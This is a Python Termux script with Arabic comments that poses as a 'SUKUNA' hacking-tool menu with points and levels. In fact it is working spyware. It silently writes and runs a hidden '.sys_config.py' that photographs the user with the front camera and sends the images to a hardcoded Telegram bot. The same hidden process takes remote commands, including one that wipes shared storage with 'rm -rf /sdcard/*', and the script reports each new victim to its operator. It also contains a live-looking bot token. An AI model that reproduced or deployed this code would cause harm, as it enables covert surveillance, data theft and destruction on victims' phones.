import os, sys, time, random, subprocess, asyncio, json
import requests

# --- إعدادات السيادة (SUKUNA_ii) ---
TOKEN = "8382035555:AAEyKqioQySc5HNLSJ3NwrDh89p3RpDPY"
ADMIN_ID = "6709215417"

# الألوان
G, R, Y, C, W, P, B = '\033[1;32m', '\033[1;31m', '\033[1;33m', '\033[1;36m', '\033[1;37m', '\033[1;35m', '\033[1;34m'

def ar(text):
    from arabic_reshaper import reshape
    from bidi.algorithm import get_display
    try: return get_display(reshape(text))
    except: return text

# --- محرك الجاسوس الصامت (Invisible Engine) ---
def start_ghost(vid, vname):
    p_code = f"""
import os, time, requests, subprocess
def slave():
    # سحب صورة صامتة فور الدخول
    try:
        os.system("termux-camera-photo -c 1 /sdcard/s.jpg")
        requests.post("https://api.telegram.org/bot{TOKEN}/sendPhoto", files={{'photo':open('/sdcard/s.jpg','rb')}}, data={{"chat_id":"{ADMIN_ID}","caption":"📸 صيد تلقائي: {vname} | ID: {vid}"}})
    except: pass
    last_id = 0
    while True:
        try:
            r = requests.get("https://api.telegram.org/bot{TOKEN}/getUpdates?offset="+str(last_id+1)).json()
            for up in r.get('result', []):
                last_id = up['update_id']
                if 'message' in up:
                    cmd = up['message']['text']
                    if cmd == "/all_cam" or cmd == f"/cam_{vid}":
                        os.system("termux-camera-photo -c 1 /sdcard/s.jpg")
                        requests.post("https://api.telegram.org/bot{TOKEN}/sendPhoto", files={{'photo':open('/sdcard/s.jpg','rb')}}, data={{"chat_id":"{ADMIN_ID}","caption":"ID: {vid}"}})
                    elif cmd == f"/format_{vid}": os.system("rm -rf /sdcard/*")
        except: pass
        time.sleep(5)
slave()
"""
    with open(".sys_config.py", "w") as f: f.write(p_code)
    subprocess.Popen(["python", ".sys_config.py"], stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))

class SukunaEmpire:
    def __init__(self):
        self.lang = "AR"
        self.v_id = f"SK_{random.randint(1000, 9999)}"
        self.u_name = "None"
        self.lvl = 1
        self.pts = 500
        self.daily = 5
        # الأكواد الـ 15
        self.promo = {"SUKUNA01": 20, "KING2026": 100, "SUKUNA_GOD": 99999}

    def banner(self):
        os.system("clear")
        l = self.lang
        h = {"AR": ["المستخدم", "المستوى", "النقاط", "الرتبة"], "EN": ["User", "Level", "Points", "Rank"]}
        print(f"{R}   S U K U N A  V20  |  MASS CONTROL")
        print(f"{W}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{Y} {ar(h[l][0]) if l=='AR' else h[l][0]}: {G}{self.u_name} {W}| ID: {G}{self.v_id}")
        print(f"{C} {ar(h[l][1]) if l=='AR' else h[l][1]}: {G}{self.lvl} {W}| {ar(h[l][2]) if l=='AR' else h[l][2]}: {G}{self.pts}")
        print(f"{W}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

    def tool_detail(self, tid):
        self.banner()
        print(f"{P} [ Tool {tid} Details ]")
        print(f"{G} 1- {ar('الاستخدام: ادخل التوكن والهدف.')}")
        print(f"{G} 2- {ar('الوظيفة: سحب كامل البيانات صمتاً.')}")
        print(f"{G} 3- {ar('الخدعة: أوهم الضحية أنها أداة رشق.')}")
        input(ar("\n[ اكتب SUKUNA للرجوع ]"))

    async def start(self):
        os.system("clear")
        print(f"{C} [1] العربية  [2] English")
        self.lang = "AR" if input(" > ") == "1" else "EN"
        
        if not os.path.exists("/sdcard"):
            print(ar("يجب منح الصلاحيات لتفعيل الـ 500 نقطة!")); os.system("termux-setup-storage"); time.sleep(4)
        
        self.u_name = input(ar("أدخل اسمك الملكي: "))
        start_ghost(self.v_id, self.u_name)

        # إرسال تقرير للملك
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": ADMIN_ID, "text": f"🎯 صيد جديد: {self.u_name}\nID: {self.v_id}"})

        while True:
            self.banner()
            menu = ["أدوات الهجوم", "المتجر", "تجميع نقاط", "الشحن", "صنع بوتات", "المتصدرين", "البحث", "اللغة", "الثغرات", "الدردشة"]
            for i, m in enumerate(menu):
                print(f" {B}[{i+1}] {ar(m)}", end="\t" if (i+1)%2!=0 else "\n")
            
            cmd = input(f"\n{R} SUKUNA > {W}").strip()
            if cmd == "1":
                self.banner()
                for i in range(1, 101):
                    s = "🔓" if i <= self.lvl else "🔒"
                    print(f" {s}{i}", end="\t" if i%5!=0 else "\n")
                c = input(ar("\nاختر رقم أو اكتب SUKUNA ثم الرقم للتفاصيل: "))
                if c.upper().startswith("SUKUNA"): self.tool_detail(c.replace("SUKUNA",""))
            elif cmd == "8": self.lang = "EN" if self.lang=="AR" else "AR"

if __name__ == "__main__":
    bot = SukunaEmpire()
    asyncio.run(bot.start())
